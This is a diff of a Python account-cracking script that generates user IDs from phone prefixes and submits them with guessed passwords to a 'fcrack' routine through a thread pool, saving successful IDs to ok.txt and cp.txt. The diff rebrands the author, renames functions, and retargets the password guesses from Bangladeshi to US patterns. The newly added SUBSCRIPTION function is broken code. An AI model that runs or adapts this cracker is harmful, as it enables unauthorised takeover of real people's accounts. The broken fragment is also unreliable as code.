@@ -1,4 +1,5 @@
-#AUTHOR : MR MONSTER
+#AUTHOR : MR WOLF
+#GITHUB: mrwolf_danger
 #version: 2.0
 #this is open source.
 
@@ -1187,7 +1188,7 @@ def svn_digit():
 	user=[]
 	os.system('clear')
 	print(logo)
-	print('[•] EXAMPLE :92318,92345,92323,92306.ETC')
+	print('[•] EXAMPLE :1212,1315,1347,1516.ETC')
 	lines()
 	kode = input('[•]\033[1;37m PUT YOUR SIM CODE : ')
 	os.system('clear')
@@ -1259,7 +1260,7 @@ def ali_khan():
 
 #_______
 
-def US():
+def wolf_boy():
 	user=[]
 	os.system('clear')
 	print(logo)
@@ -1364,7 +1365,7 @@ def free_fire():
 
 #___________
 
-def Usa():
+def bangladeh():
 	user=[]
 	os.system('clear')
 	print(logo)
@@ -1390,7 +1391,7 @@ def Usa():
 		lines()
 		for guru in user:
 			uid = kode+guru
-			pwx = [guru,'+88','bangladish']
+			pwx = [guru,'+1','USA']
 			yaari.submit(fcrack,uid,pwx,tl)
 	print('[✓] Crack process has been completed')
 	print('[?] Ids saved in ok.txt,cp.txt')
@@ -1529,3 +1530,15 @@ def fcrack(uid,pwx,tl):
     except:
         pass
         
+def SUBSCRIPTION():
+  os.system('clear')
+  print(logo)
+  uuid = str(os.geteuid()) + str(os.getlogin())
+  id = "-".join(uuid)
+
+  
+      SUBSCRIPTION()
+  except:
+    sys.exit()
+
+rehan()
